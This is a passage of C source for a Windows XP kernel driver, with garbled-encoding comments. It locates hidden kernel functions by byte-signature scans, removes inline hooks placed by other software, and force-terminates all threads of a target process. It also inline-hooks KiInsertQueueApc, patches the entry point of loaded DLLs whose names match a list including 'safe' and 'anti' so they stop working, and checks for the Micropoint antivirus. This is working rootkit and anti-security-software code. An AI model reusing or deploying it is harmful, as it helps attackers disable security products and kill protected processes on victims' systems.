	OBJECT_ATTRIBUTES	oa;
	IO_STATUS_BLOCK	    ioStatus;
	PCHAR	            pKernelName;
	DWORD	            rc, dwNeededSize;
	PMODULES	pModules = (PMODULES)&pModules;
#define MAX_PATH 0x104
	WCHAR	wSystemRoot[MAX_PATH+1], wFileName[MAX_PATH+1];
	UNICODE_STRING  SystemRoot = {0, (MAX_PATH+1) << 1, wSystemRoot};

	RTL_QUERY_REGISTRY_TABLE rqrtSystemRoot[] = {
		{NULL, RTL_QUERY_REGISTRY_DIRECT, L"SystemRoot", &SystemRoot, REG_NONE, NULL, 0},
		{NULL, 0, NULL, NULL, REG_NONE, NULL, 0}
	};


	////////////////////////////////////////////////

	try {
		//-------------------------------------------------------------------------------------
		// ȡ��ϵͳ���ص�ģ����Ϣ -- ntoskrnl is always first there
		//
		rc = ZwQuerySystemInformation (SystemModuleInformation, pModules, 4, &dwNeededSize);

		if (rc == STATUS_INFO_LENGTH_MISMATCH) {
			pModules = ExAllocatePool (PagedPool, dwNeededSize);
			RtlZeroMemory (pModules, dwNeededSize);

			rc = ZwQuerySystemInformation (SystemModuleInformation, pModules, dwNeededSize, NULL);
		} else {
			DbgPrint("ZwQuerySystemInformation  Error\n");
			goto End;
		}
		if (!NT_SUCCESS(rc)) {
			goto End;
		}

		ModuleBase = (DWORD)pModules->smi.Base;
		pKernelName = pModules->smi.ModuleNameOffset + pModules->smi.ImageName;

		//-------------------------------------------------------------------------------------
		// �� HKLM\Software\Microsoft\Windows NT\CurrentVersion �ж�ȡSystemRoot ��ֵ.��ϵͳĿ¼
		// ż����XP SP2. Ϊ"C:\WINDOWS"
		//
		ntStatus = RtlQueryRegistryValues (RTL_REGISTRY_WINDOWS_NT, L"", rqrtSystemRoot, NULL, NULL);
		if (ntStatus != STATUS_SUCCESS) {
			DbgPrint("RtlQueryRegistryValues  Error\n");
			goto End;
		}

		//
		// wSystemRoot���Ǳ�����ϵͳĿ¼������ĵ�0λָ��.������һλ����'\0',
		// ����Ų�� SystemRoot.Length - 2 ����,���Ǽ�鵹����2λ�Ƿ����'\'.��������+��
		//
		if ( *(PWORD) ( (DWORD) wSystemRoot + SystemRoot.Length - 2 ) != '\\' ) {
			if ( !NT_SUCCESS ( RtlAppendUnicodeToString (&SystemRoot, L"\\") ) ) {
			}
		}

		// ��wFileName�а��� ntoskrnl.exe ������·��
		_snwprintf(
			wFileName,
			sizeof(wFileName),
			L"\\DosDevices\\%ssystem32\\%S",
			wSystemRoot,
			pKernelName
			);	

		DbgPrint("��ǰ�ں�ģ��ȫ·�� : %ws\n", wFileName);
		RtlInitUnicodeString (&FileName, wFileName);	
		InitializeObjectAttributes (&oa, &FileName, OBJ_CASE_INSENSITIVE, NULL, NULL);


		//-------------------------------------------------------------------------------------
		// ��ntoskrnl.exe�ļ�
		ntStatus = NtOpenFile(
			&ntFileHandle,
			GENERIC_READ | SYNCHRONIZE,
			&oa,
			&ioStatus,
			FILE_SHARE_READ,
			FILE_SYNCHRONOUS_IO_NONALERT
			);


		if (!NT_SUCCESS(ntStatus))
		{
			ntStatus = STATUS_UNSUCCESSFUL;
			DbgPrint("IoCreateFile  Error\n");
			goto End;
		}

		// IMAGE_DOS_HEADER
		// +0x3c e_lfanew
		byteOffset.LowPart = 0x3C; 
		byteOffset.HighPart = 0;

		// ���ļ��󣬶�֮
		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			&NtHeadersOffset,  
			4,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			DbgPrint("ZwReadFile  1 Error\n");
			goto End;
		}

		// NtHeadersOffset�б������PEͷ��ƫ�Ƶ�ַ
		// IMAGE_OPTIONAL_HEADER
		// +0x010 AddressOfEntryPoint
		// ָ��������RVA��ַ
		byteOffset.LowPart = NtHeadersOffset + 0x28; 
		byteOffset.HighPart = 0;

		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			&AddressOfEntryPoint,
			4,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			DbgPrint("ZwReadFile  2 Error\n");
			goto End;
		}

		// IMAGE_OPTIONAL_HEADER
		// +0x038 SizeOfImage 
		// �ڴ�������PE��ӳ��ߴ�
		byteOffset.LowPart = NtHeadersOffset + 0x50; 
		byteOffset.HighPart = 0;

		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			&SizeOfImage,
			4,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			DbgPrint("ZwReadFile 3 Error\n");
			goto End;
		}

		// IMAGE_OPTIONAL_HEADER
		// +0x01c ImageBase
		// ���������ѡ��RVA
		byteOffset.LowPart = NtHeadersOffset + 0x34;
		byteOffset.HighPart = 0;

		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			&ImageBase,
			4,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			DbgPrint("ZwReadFile 4 Error\n");
			goto End;
		}

		// ����һϵ�еĶ�PE�󣬵õ�һЩƫ��ֵ������PE���ڴ�����Ҫ�Ŀռ䡣
		// Ϊ�����һ���Ƿ�ҳ�ڴ�
		// ���ļ������ݶ���ȡ������
		// ��ȡ�ļ��Ĵ�С,����һ���ڴ��������
		//DbgPrint("��ȡ�ļ��Ĵ�С,����һ���ڴ��������\n");
		ZwQueryInformationFile (ntFileHandle, &ioStatus, &fsi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);

		FileContent =  ExAllocatePool (NonPagedPool, fsi.EndOfFile.LowPart);

		if (FileContent == NULL)
		{
			ntStatus = STATUS_UNSUCCESSFUL;
			ZwClose(ntFileHandle);

			DbgPrint("ExAllocatePool  Error\n");
			goto End;
		}

		byteOffset.LowPart = 0;
		byteOffset.HighPart = 0;

		ntStatus = ZwReadFile(ntFileHandle, 
			NULL,
			NULL,
			NULL,
			&ioStatus,
			FileContent,
			fsi.EndOfFile.LowPart,
			&byteOffset,
			NULL);

		if (!NT_SUCCESS(ntStatus))
		{
			ZwClose(ntFileHandle);
			ExFreePool(FileContent);

			DbgPrint("ZwReadFile ��Ҫ�������ݣ�����һƬ�Ƿ�ҳ�ڴ�ʧ��  Error\n");
			goto End;
		}

		if (fsi.EndOfFile.LowPart <= 0)
		{
			ntStatus = STATUS_NOT_FOUND;
			ZwClose(ntFileHandle);
			ExFreePool(FileContent);
			DbgPrint("NeedSize <= 0  Error\n");
			goto End;
		}

		GetHeaders (FileContent, &pfh, &poh, &psh);

		//DbgPrint("psh: %08lx\n", (PVOID)psh);

		//DbgPrint("start search....\n");
		// ��ʼ���������� =.=!
		for (i = 0; i < fsi.EndOfFile.LowPart; i++)          
		{
			if ( (FileContent[i] == 0x8B) && (FileContent[i+1] == 0xFF) && (FileContent[i+2] == 0x55) && (FileContent[i+3] == 0x8B) &&
				(FileContent[i+4] == 0xEC) && (FileContent[i+5] == 0x83) && (FileContent[i+6] == 0xEC) && (FileContent[i+7] == 0x0C) &&
				(FileContent[i+8] == 0x83) && (FileContent[i+9] == 0x4D) && (FileContent[i+10] == 0xF8) && (FileContent[i+11] == 0xFF) &&
				(FileContent[i+12] == 0x56) && (FileContent[i+13] == 0x57) && (FileContent[i+14] == 0x8B) && (FileContent[i+15] == 0x7D) &&
				(FileContent[i+16] == 0x08) && (FileContent[i+17] == 0x8D) && (FileContent[i+18] == 0xB7) && (FileContent[i+19] == 0x48) &&
				(FileContent[i+20] == 0x02) && (FileContent[i+21] == 0x00) && (FileContent[i+22] == 0x00) && (FileContent[i+23] == 0xF6) &&
				(FileContent[i+24] == 0x06) && (FileContent[i+25] == 0x40) && (FileContent[i+26] == 0xC7) && (FileContent[i+27] == 0x45) &&
				(FileContent[i+28] == 0xF4) && (FileContent[i+29] == 0xC0) && (FileContent[i+30] == 0xBD) && (FileContent[i+31] == 0xF0) &&
				(FileContent[i+32] == 0xFF) && (FileContent[i+33] == 0x0F) && (FileContent[i+34] == 0x85)  )
			{
				//DbgPrint(" ������~\n");

				DbgPrint("�ļ�ƫ��i:  %08lx\n", (PVOID)i);
				// �ҵ���
				sudami_1 = Offset2RVA( i, psh, pfh->NumberOfSections );

				//DbgPrint("RVA -- sudami_1 :  %08lx\n", (PVOID)sudami_1);

				if (sudami_1  == 0) {
					DbgPrint("sudami_1  == 0  Error\n");
					goto NotFound;
				}

				if (sudami_1  > SizeOfImage) {
					DbgPrint("sudami_1  > SizeOfImage  Error\n");
					goto NotFound;
				}

				sudami_1 += ModuleBase;

				if (!MmIsAddressValid((PVOID)sudami_1 )) {
					DbgPrint("!MmIsAddressValid((PVOID)sudami_1 )  Error\n");
					goto NotFound;
				}

				PspTerminateThreadByPointer = (PSPTERMINATETHREADBYPOINTER)sudami_1;

				DbgPrint( "PspTerminateThreadByPointer:\t0x%08x\n", (ULONG)PspTerminateThreadByPointer );
				break;
			}		
		}


		for (i = 0; i < fsi.EndOfFile.LowPart; i++)          
		{
			if ( (FileContent[i] == 0x8B) && (FileContent[i+1] == 0xFF) && (FileContent[i+2] == 0x55) && (FileContent[i+3] == 0x8B) &&
				(FileContent[i+4] == 0xEC) && (FileContent[i+5] == 0x83) && (FileContent[i+6] == 0xEC) && (FileContent[i+7] == 0x10) &&
				(FileContent[i+8] == 0x53) && (FileContent[i+9] == 0x56) && (FileContent[i+10] == 0x57) && (FileContent[i+11] == 0x64) &&
				(FileContent[i+12] == 0xA1) && (FileContent[i+13] == 0x24) && (FileContent[i+14] == 0x01) && (FileContent[i+15] == 0x00) &&
				(FileContent[i+16] == 0x00) && (FileContent[i+17] == 0x83) && (FileContent[i+18] == 0x7D) && (FileContent[i+19] == 0x08) &&
				(FileContent[i+20] == 0x00) && (FileContent[i+21] == 0x8B) && (FileContent[i+22] == 0xF8) && (FileContent[i+23] == 0x8B) &&
				(FileContent[i+24] == 0x47) && (FileContent[i+25] == 0x44) && (FileContent[i+26] == 0x89) && (FileContent[i+27] == 0x45) &&
				(FileContent[i+28] == 0xF0) && (FileContent[i+29] == 0x0F) && (FileContent[i+30] == 0x84) )
			{
				//DbgPrint(" ������~\n");

				DbgPrint("�ļ�ƫ��i:  %08lx\n", (PVOID)i);
				// �ҵ���
				sudami_1 = Offset2RVA( i, psh, pfh->NumberOfSections );

				//DbgPrint("RVA -- sudami_1 :  %08lx\n", (PVOID)sudami_1);

				if (sudami_1  == 0) {
					DbgPrint("sudami_1  == 0  Error\n");
					goto NotFound;
				}

				if (sudami_1  > SizeOfImage) {
					DbgPrint("sudami_1  > SizeOfImage  Error\n");
					goto NotFound;
				}

				sudami_1 += ModuleBase;

				if (!MmIsAddressValid((PVOID)sudami_1 )) {
					DbgPrint("!MmIsAddressValid((PVOID)sudami_1 )  Error\n");
					goto NotFound;
				}

				NtTerminateProcess = (PUCHAR)sudami_1;
				DbgPrint( "NtTerminateProcess:\t0x%08x\n", (ULONG)NtTerminateProcess );

				ExFreePool(FileContent);
				ZwClose(ntFileHandle);

				goto End;
			}	

		}

NotFound:

		DbgPrint("���˰���û�ҵ���Ӧ��������û��׼~~~\n");
		ntStatus = STATUS_NOT_FOUND;
		ZwClose(ntFileHandle);
		ExFreePool(FileContent);

	} except(EXCEPTION_EXECUTE_HANDLER) {
	}

End:
	PsTerminateSystemThread(STATUS_SUCCESS);
	return;
}

//
// �����������߳�Ϊϵͳ��־,�Ա�رշ���
//
ULONG GetThreadFlagsOffset()
{
	PUCHAR addr;
	PUCHAR p;
	ULONG Offset;

	addr = (PUCHAR) GetFunctionAddr( L"PsTerminateSystemThread" );
	for (p=addr;p<addr+PAGE_SIZE;p++)
	{
		if ( *(PUSHORT)p == 0x80F6 )
		{
			Offset=*(PULONG)(p+2);
			return Offset;
		}
	}
}


//
// �ָ�KeInsertQueueApc��inline hook
//
VOID XPRestoreKeInsertQueueApc ()
{
	PUCHAR addr;
	KIRQL  oldIrql;

	addr = (PUCHAR) GetFunctionAddr( L"KeInsertQueueApc" );

	// ��ֹϵͳд����������IRQL��DPC��Ȼ��ָ�KeInsertQueueApc��Inline Hook
	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();

	// �ָ�KeInsertQueueApc��ǰ9�ֽ�
	RtlCopyMemory ( (BYTE*)addr, KeInsertQueueApc_orig_code, 9 );

	KeLowerIrql(oldIrql);

	WPON();

	//DbgPrint("XPRestoreKeInsertQueueApc Success\n");
}

//
// �ָ�KiInsertQueueApc��inline hook
//
VOID XPRestoreKiInsertQueueApc ()
{
	KIRQL  oldIrql;

	if(  NULL == KiInsertQueueApc ) {
		return;
	}


	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();
	RtlCopyMemory ( (BYTE*)KiInsertQueueApc, KiInsertQueueApc_orig_code, 11 );
	KeLowerIrql(oldIrql);
	WPON();

	//DbgPrint("XPRestoreKiInsertQueueApc Success\n");
}

//
// �ָ�PspTerminateThreadByPointer��inline hook
//
VOID XPRestorePspTerminateThreadByPointer ()
{
	KIRQL  oldIrql;

	if(  NULL == PspTerminateThreadByPointer ) {
		return;
	}

	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();
	RtlCopyMemory ( (BYTE*)PspTerminateThreadByPointer, PspTerminateThreadByPointer_orig_code, 8 );
	KeLowerIrql(oldIrql);
	WPON();

	//DbgPrint("XPRestorePspTerminateThreadByPointer Success\n");
}

//
// �ָ�NtTerminateProcess��inline hook
//
VOID XPRestoreNtTerminateProcess ()
{
	KIRQL  oldIrql;

	if(  NULL == NtTerminateProcess ) {
		return;
	}

	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();
	RtlCopyMemory ( (BYTE*)NtTerminateProcess, PspTerminateThreadByPointer_orig_code, 5 );
	KeLowerIrql(oldIrql);
	WPON();

	//DbgPrint("XPRestoreNtTerminateProcess Success\n");
}


//
// �ָ� PsGetNextProcessThread ��inline hook
//
VOID XPRestorePsGetNextProcessThread  ()
{
	KIRQL  oldIrql;

	if(  NULL == g_PsGetNextProcessThread ) {
		return;
	}

	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();
	RtlCopyMemory ( (BYTE*)g_PsGetNextProcessThread, PspTerminateThreadByPointer_orig_code, 5 );
	KeLowerIrql(oldIrql);
	WPON();

	//DbgPrint("XPRestorePsGetNextProcessThread  Success\n");
}

//
//
//
NTSTATUS
My_TerminateProc (
				  PEPROCESS Process,
				  NTSTATUS ExitStatus
				  )
				  /*++

				  Author: sudami  08/03/14

				  ����:
				  Process - Ҫ�����Ľ��̵�EPROCESS

				  ExitStatus - �˳�״̬

				  ����:
				  ʵ�ִ�NtTerminateProcess-->PspTerminateThreadByPointer-->
				  KeInsertQueueApc-->PspExitThread�Ĺ���

				  --*/
{
	PLIST_ENTRY ListEntry;
	PETHREAD NewThread, CurrentThread;
	PETHREAD Thread;
	NTSTATUS st;
	ULONG ThreadFlagsOffset;
	ULONG    OldMask;
	PULONG ThreadFlags, CrossThreadFlags;
	PKAPC    ExitApc=NULL;
	LARGE_INTEGER ShortTime = {(ULONG)(-10 * 1000 * 100), -1}; // 100 milliseconds
	int i = 0;

	//g_PsGetNextProcessThread = (My_PsGetNextProcessThread)0x8057b3b9;

	ThreadFlagsOffset = GetThreadFlagsOffset();

	i++;

	if ( Process == NULL) {
		if ( 1 == i ) {
			DbgPrint("My_TerminateProc�Ĳ���1��Ч --> Process == NULL\n");
		}
		return STATUS_UNSUCCESSFUL;
	}

	if ( g_PsGetNextProcessThread == NULL) {
		if ( 1 == i ) {
			DbgPrint("g_PsGetNextProcessThread == NULL\n");
		}
		return STATUS_UNSUCCESSFUL;
	}

	if ( PspTerminateThreadByPointer == NULL) {
		if ( 1 == i ) {
			DbgPrint("PspTerminateThreadByPointer == NULL\n");
		}
		return STATUS_UNSUCCESSFUL;
	}

	// �Ȼָ��ٵ���

	XPRestoreKeInsertQueueApc ();
	XPRestoreKiInsertQueueApc ();
	XPRestorePspTerminateThreadByPointer ();
	XPRestoreNtTerminateProcess ();
	XPRestorePsGetNextProcessThread  ();

	for (Thread = g_PsGetNextProcessThread(Process, NULL);
		Thread != NULL;
		Thread =  g_PsGetNextProcessThread(Process, Thread)) {

			st = STATUS_SUCCESS;
			if (Thread != PsGetCurrentThread()) {

				PspTerminateThreadByPointer( Thread, 0 );
			}
	}

	return st;
}




ULONG
RVA2Offset (
			ULONG RVA, 
			PIMAGE_SECTION_HEADER pSectionHeader, 
			ULONG Sections
			)
{    
	ULONG i;

	if(RVA < pSectionHeader[0].PointerToRawData)
		return RVA;

	for(i = 0; i < Sections; i++)
	{   
		if(RVA >= pSectionHeader[i].VirtualAddress &&
			RVA < pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData)           
			return (RVA - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData);
	}

	return 0;
}


ULONG 
Offset2RVA (
			ULONG Offset, 
			PIMAGE_SECTION_HEADER pSectionHeader, 
			ULONG Sections
			)
{   
	ULONG i;

	if(Offset < pSectionHeader[0].PointerToRawData)
		return Offset;

	for(i = 0; i < Sections; i++)
	{
		if(Offset >= pSectionHeader[i].PointerToRawData &&
			Offset < pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData)
			return (Offset - pSectionHeader[i].PointerToRawData + pSectionHeader[i].VirtualAddress);
	}

	return 0;
}

//
// ֹͣinline hook
//
VOID UnHookKiInsertQueueApc ()
{
	KIRQL  oldIrql;

	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();

	RtlCopyMemory ( (BYTE*)KiInsertQueueApc, g_OrigCode, 5 );

	KeLowerIrql(oldIrql);
	WPON();

	g_bHooked = FALSE;
}


//
// ��ʼinline hook --  KiInsertQueueApc
//
VOID HookKiInsertQueueApc ()
{ 
	KIRQL  oldIrql;

	if ( KiInsertQueueApc == NULL) {
		DbgPrint("KiInsertQueueApc == NULL\n");
		return;
	}

	//DbgPrint("��ʼinline hook --  KiInsertQueueApc\n");
	DbgPrint( "KiInsertQueueApc�ĵ�ַ:\t0x%08x\n", (ULONG)KiInsertQueueApc );
	// ����ԭ������ǰ5�ֽ�����
	RtlCopyMemory (g_OrigCode, (BYTE*)KiInsertQueueApc, 5);
	*( (ULONG*)(g_HookCode + 1) ) = (ULONG)fake_KiInsertQueueApc - (ULONG)KiInsertQueueApc - 5;


	// ��ֹϵͳд����������IRQL��DPC
	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();


	RtlCopyMemory ( (BYTE*)KiInsertQueueApc, g_HookCode, 5 );
	*( (ULONG*)(jmp_orig_code + 1) ) = (ULONG) ( (BYTE*)KiInsertQueueApc + 5 );

	RtlCopyMemory ( (BYTE*)Proxy_KiInsertQueueApc, g_OrigCode, 5);
	RtlCopyMemory ( (BYTE*)Proxy_KiInsertQueueApc + 5, jmp_orig_code, 7);

	// �ָ�д����������IRQL
	KeLowerIrql(oldIrql);
	WPON();

	g_bHooked = TRUE;


}

//
// ��ת�����ǵĺ����������Ԥ����
//
VOID
fake_KiInsertQueueApc (
					   PKAPC Apc,
					   KPRIORITY Increment
					   )
{
	// Ԥ����

	DbgPrint("inline hook --  KiInsertQueueApc �ɹ�\n");
	Proxy_KiInsertQueueApc( Apc, Increment );
}

//
// ��������������ת��ԭ�����м���ִ��
//
__declspec (naked) 
VOID
Proxy_KiInsertQueueApc (
						PKAPC Apc,
						KPRIORITY Increment
						)
{
	__asm {  // ��12�ֽ�
		_emit 0x90
			_emit 0x90
			_emit 0x90
			_emit 0x90
			_emit 0x90  // ǰ5�ֽ�ʵ��ԭ������ͷ5�ֽڹ���
			_emit 0x90  // ������jmp
			_emit 0x90
			_emit 0x90
			_emit 0x90
			_emit 0x90  // ��4�ֽڱ���ԭ����+5���ĵ�ַ
			_emit 0x90  
			_emit 0x90  // ��Ϊ�ǳ�ת��,���Ա����� 0x0080
	}
}


//
//
//
VOID
MyLoadImageRoutine(
				   IN PUNICODE_STRING ImageName,
				   IN HANDLE ProcessId,
				   IN PIMAGE_INFO ImageInfo
				   )
				   /*++

				   ����: sudami  08/03/05

				   ����:
				   �����ģ��֪ͨ�ص������н��й��ˡ����ǲ���DLL����,���޸���DLL��ǰ5�ֽ�
				   ʹ��ֱ��ʧЧ.

				   --*/
{
	BOOL  bFind;
	ULONG Length;
	WCHAR Name[300];
	PEPROCESS   proc;
	PVOID       pImageBase;
	SIZE_T      dwSize;
	PVOID       pOEP;
	KIRQL       oldIrql;
	PIMAGE_DOS_HEADER       dos;
	PIMAGE_NT_HEADERS       nth;
	PIMAGE_OPTIONAL_HEADER  poh;
	PHYSICAL_ADDRESS physicalAddress;

	if (ImageName == NULL) {
		return;
	}

	Length = ImageName->Length;
	if ((Length == 0) || (ImageName->Buffer == NULL)) {
		return;
	}

	bFind = FALSE;
	RtlCopyMemory(Name , ImageName->Buffer, ImageName->MaximumLength );
	_wcsupr(Name);

	// 
	// ԭIDB��������һ���ṹ�壨ȫ�ֱ�����������ÿ��DLL���ֺ�������ŵ���һ��1��3�����֡�
	//			0�������� SYSTEM32 Ŀ¼��
	//			1�������� WINDOWSĿ¼��
	//			2�������� COMMON FILESĿ¼��
	//			3�����������Ķ��ǲ�����DLL
	// ż�������һ�£�Ч��һ��
	//				-- sudami 08/03/08                  
	//
	if ( ( (wcsstr( Name, L"DLLWM.DLL" ) != NULL) && (wcsstr( Name, L"SYSTEM32" ) != NULL) ) || 
		( (wcsstr( Name, L"WININFO.RXK" ) != NULL) && (wcsstr( Name, L"COMMON FILES" ) != NULL) ) || 
		( (wcsstr( Name, L"RICHDLL.DLL" ) != NULL) && (wcsstr( Name, L"WINDOWS" ) != NULL) ) || 
		( (wcsstr( Name, L"RICHDLL.DLL" ) != NULL) && (wcsstr( Name, L"WINNT" ) != NULL) ) || 
		(wcsstr( Name, L"WINDHCP.DLL" ) != NULL) || 
		(wcsstr( Name, L"DLLHOSTS.DLL" ) != NULL) || 
		(wcsstr( Name, L"NOTEPAD.DLL" ) != NULL) || 
		(wcsstr( Name, L"RPCS.DLL" ) != NULL) || 
		(wcsstr( Name, L"RDSHOST.DLL" ) != NULL) || 
		(wcsstr( Name, L"LGSYM.DLL" ) != NULL) || 
		(wcsstr( Name, L"RUND11.DLL" ) != NULL) || 
		(wcsstr( Name, L"MDDDSCCRT.DLL" ) != NULL) || 
		(wcsstr( Name, L"WSVBS.DLL" ) != NULL) || 
		(wcsstr( Name, L"CMDBCS.DLL" ) != NULL) || 
		(wcsstr( Name, L"UPXDHND.DLL" ) != NULL) || 
		(wcsstr( Name, L"RDFHOST.DLL" ) != NULL) ||
		(wcsstr( Name, L"safe" ) != NULL) ||
		(wcsstr( Name, L"anti" ) != NULL) ) {
			bFind = TRUE;
	}

	if ( bFind == FALSE ) {
		return;
	}

	if( !NT_SUCCESS(PsLookupProcessByProcessId( ProcessId, &proc )) ) {
		return;
	}

	KeAttachProcess (proc); // ���ŵ��˽���

	pImageBase = ImageInfo->ImageBase;
	dwSize     = ImageInfo->ImageSize;

	try { // ȷ����ַ����ȷ��
		ProbeForRead( pImageBase, dwSize, sizeof(UCHAR));
	} except(EXCEPTION_EXECUTE_HANDLER) {
		return;
	}

	// �õ�������ڵ�ַ
	dos     = (PIMAGE_DOS_HEADER) pImageBase;
	nth     = (PIMAGE_NT_HEADERS) (dos->e_lfanew + (char *)pImageBase);
	poh     = (PIMAGE_OPTIONAL_HEADER) &nth->OptionalHeader;

	if( (dos->e_magic != 0x5a4d) || (nth->Signature != 0x00004550) ) {// "MZ" "PE\0\0"
		return;
	}

	pOEP = (PVOID)( poh->AddressOfEntryPoint + (char *)pImageBase );
	physicalAddress = MmGetPhysicalAddress( pOEP );

	ProbeForWrite ( pOEP, 5, sizeof(CHAR));

	// �޸���ǰ5�ֽڵ�����,ʹ��ʧЧ
	WPOFF();
	oldIrql = KeRaiseIrqlToDpcLevel();

	RtlCopyMemory ( (BYTE*)pOEP, g_Code, 5 );

	KeLowerIrql(oldIrql);
	WPON();

	KeDetachProcess();
}

BOOL IsMPExist()
{
	NTSTATUS		status;
	HANDLE          KeyHandle;
	UNICODE_STRING  KeyName;
	OBJECT_ATTRIBUTES   objectAttributes;
	WCHAR			Buffer[128] = L"\\REGISTRY\\MACHINE\\SOFTWARE\\Micropoint";
	LARGE_INTEGER interval;
	interval.QuadPart = -5 * 1000 * 10;     // 5ms, relative

	RtlInitUnicodeString( &KeyName, Buffer );

	InitializeObjectAttributes(
		&objectAttributes,
		&KeyName,
		OBJ_CASE_INSENSITIVE,
		(HANDLE)NULL,
		NULL
		);

	status = ZwOpenKey(
		&KeyHandle,
		KEY_READ | KEY_WRITE,
		&objectAttributes
		);

	if (NT_SUCCESS(status)) { //����
		DbgPrint("IsMPExist() -- ΢�����\n");
		g_bMP = TRUE;
		return TRUE;
	}

	DbgPrint("IsMPExist() -- ΢�㲻����\n");
	return FALSE;
}

////////////////////////////////////----- END OF FILE ------////////////////////////////////////////////